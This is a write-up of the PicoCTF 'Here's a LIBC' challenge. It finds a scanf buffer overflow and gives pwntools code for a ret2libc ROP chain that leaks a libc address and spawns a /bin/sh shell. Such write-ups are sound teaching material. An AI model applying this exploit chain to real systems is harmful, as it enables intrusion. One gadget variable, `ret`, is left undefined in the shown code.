# Here's a LIBC
## Write-up of the PicoCTF Binary Exploitation Challenge

<img	src="Challenge Description.png"

## Setup

3 files are provided to us for the challenge and the address
to the server is also provided.

Lets download the files and try to run the binary

<img	src="Setup0.png"
		alt="Challenge Description"
/>

We get a crash
This occurs because our linker is a newer version than the libc provided

<img	src="Setup1.png"
		alt="Challenge Description"
/>

We can fix this using pwninit which will automatically take care of this

<img	src="Setup2.png"
		alt="Challenge Description"

This fixed the problem

## Analysis

Lets open the binary in Ghidra and take a look at whats going on

<img	src="Analysis0.png"
		alt="Challenge Description"
/>

There is no input being taken in the main function but we see another function
Lets check it out

<img	src="Analysis1.png"
		alt="Challenge Description"
/>

This looks like what we are looking for  
I have retyped some variables so its easier to understand  
As we can see there is no bound checking on the scanf input  
We can easily overflow the buffer since scanf will take an input until it encounters a newline

<img	src="Analysis2.png"
		alt="Challenge Description"
/>

Sure enough, we get a segmentation fault and the program crashes  

Lets check the protections on the binaries

<img	src="Analysis3.png"
		alt="Challenge Description"
/>

The stack is not executable so we can't execute shellcode pushed onto it  
PIE is off for vuln meaning addresses won't change for the binary on each execution  
This means we can easily leak an address from libc and use it to return to libc


## Exploitation

Lets open the binary in GDB and find exactly where we overwrite RIP

Now we need to find some ROP Gadgets to leak the address of a function in libc  
We can use pwntools ROPgadget for this  
  
We will use the puts() function to print out an address in libc so we also need the address of puts@plt
We can leak the address of any function inside libc. I have chosen setbuf()

To print the address of setbuf() in libc we need to pass the address of setbuf@got to puts()  
For this we will need to find a ROP Gadget that will allow us to modify RDI

Now that we have found the relevant addresses we can leak the address of setbuf() inside libc

```py
import pwnlib.util.packing as pack
from pwn import log, process, remote

p = process("./vuln")  # Local binary

padding = b"A" * 136
pop_rdi = 0x400913  # ROP Gadget for popping rdi
setbuf_at_got = 0x601028  # Address of setbuf() in GOT
puts_at_plt = 0x400540  # Address of puts() in PLT
main = 0x400771  # Address of main for returning safely after leaking setbuf() address in libc

# ? Craft the payload to leak address of setbuf in libc
payload = padding  # Pad the stack until the stored RIP
payload += pack.p64(pop_rdi)  # Set the address of setbuf() in GOT as the first argument of puts()
payload += pack.p64(setbuf_at_got)  # This will be the first argument of puts()
payload += pack.p64(puts_at_plt)  # Call puts()
payload += pack.p64(main)  # Return to main() so the program doesnt crash

# ? Send the payload
p.sendline(payload)
p.recvline()  # Discard data we dont need
p.recvline()  # Discard data we dont need
leak = pack.u64(p.recvline().strip().ljust(8, b"\x00"))  # Format the address of setbuf() properly
log.info(f"Leaked setbuf Address -> {hex(leak)}")
```

<img	src="Exploitation5.png"
		alt="Challenge Description"
/>

Now that we have an address inside libc we can calculate the base address of libc itself  
First lets figure out the offset of setbuf() from the base address of libc

<img	src="Exploitation6.png"
		alt="Challenge Description"
/>

Now we can add this to our exploit

```py
setbuf_offset = 0x88540  # Static offset of setbuf() in libc
libc_base = leak - setbuf_offset  # Calculate base address of libc
log.info(f"libc Base Address -> {hex(libc_base)}")
```

To get a shell on the target system we will use the system() function which is also inside libc  
Lets find its address

<img	src="Exploitation7.png"
		alt="Challenge Description"
/>

```py
system_offset = 0x4F4E0  # Static offset of system() in libc
libc_system = libc_base + system_offset # Calculate the actual address of system() in libc
log.info(f"system Address -> {hex(libc_system)}")
```

We can pass "/bin/sh" to system() to get a shell  
As this string is already present inside libc we dont need to put it on the stack ourselves  
We can simply use the one already available to us  
Lets find its address 

<img	src="Exploitation8.png"
		alt="Challenge Description"
/>

```py
binsh_offset = 0x1B40FA  # Static offset of /bin/sh string in libc
libc_binsh = libc_base + binsh_offset
log.info(f"/bin/sh Address -> {hex(libc_binsh)}")
```

Now that we have all the relevant addresses we can finally craft our final payload  
Here is the remaining exploit

```py
# ? Craft the payload to call system("/bin/sh")
payload = padding  # Pad the stack until the stored RIP
payload += pack.p64(pop_rdi)  # Set the address of the string /bin/sh as the first argument of system()
payload += pack.p64(libc_binsh)  # This will be the first argument of system()
payload += pack.p64(ret)  # Align the stack to 16 bytes otherwise system() will crash
payload += pack.p64(libc_system)  # Call system()

# ? Send the payload
p.sendline(payload)

# ? Start an interactive session
p.interactive()
```

Notice we added another ROP Gadget (ret). This is to align the stack for the call to system()  
If the stack isn't aligned then we will get a segmentation fault and the program will crash  
Lets run the exploit script against the target server now

Nice. It works  
Now we can grab the flag
